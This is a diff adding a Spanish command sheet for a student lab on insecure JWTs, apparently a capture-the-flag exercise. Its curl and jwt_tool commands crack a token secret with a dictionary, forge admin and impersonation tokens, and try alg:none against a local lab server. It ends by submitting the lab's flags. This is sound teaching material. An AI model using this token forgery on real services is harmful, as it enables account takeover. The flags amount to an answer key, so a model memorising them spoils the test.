@@ -1,0 +1,34 @@
+# Lab Extra 5 — JWT inseguro — Grupo 08 — comandos de la Parte 1 (práctica)
+# Portal levantado con: PORT=8099 python3 labs/labextra5-jwt/objetivo/server.py
+# (en el informe se usa el puerto 8080 por defecto; acá 8099 para no chocar)
+# jwt_tool.py = entregas/labextra5/grupo08/src/jwt_tool.py
+
+# --- Conseguir token de diego (credenciales públicas de demo) ---
+curl -s 'localhost:8080/login?user=diego&pass=diego123'
+
+# --- R1: decodificar (el claim nota_interna no debería viajar) ---
+python3 src/jwt_tool.py decodificar <token>
+
+# --- R2: crackear secreto offline + forjar role=admin ---
+python3 src/jwt_tool.py crackear <token> ../../../labs/labextra5-jwt/caso/diccionario.txt
+python3 src/jwt_tool.py forjar mate123 --sub diego --role admin
+curl -s -H 'Authorization: Bearer <token-admin>' localhost:8080/admin
+
+# --- R3: forjar identidad sub=maria ---
+python3 src/jwt_tool.py forjar mate123 --sub maria --role user
+curl -s -H 'Authorization: Bearer <token-maria>' localhost:8080/perfil
+
+# --- Control de sanidad (§4) ---
+# (a) token real de diego (role=user) contra /admin -> 403
+curl -s -H 'Authorization: Bearer <token-real-diego>' localhost:8080/admin
+# (b) token forjado con 1 char cambiado en la firma -> 401
+curl -s -H 'Authorization: Bearer <token-admin-corrupto>' localhost:8080/admin
+
+# --- P4: alg:none (firma vacía) contra /admin -> 401 ---
+curl -s -H 'Authorization: Bearer <token-alg-none>' localhost:8080/admin
+
+# --- Entrega de flags ---
+./ctf submit extra5 R1 'FLAG{jwt_solo_base64}'
+./ctf submit extra5 R2 'FLAG{jwt_forjado_admin}'
+./ctf submit extra5 R3 'FLAG{jwt_suplantacion_idor}'
+./ctf status extra5
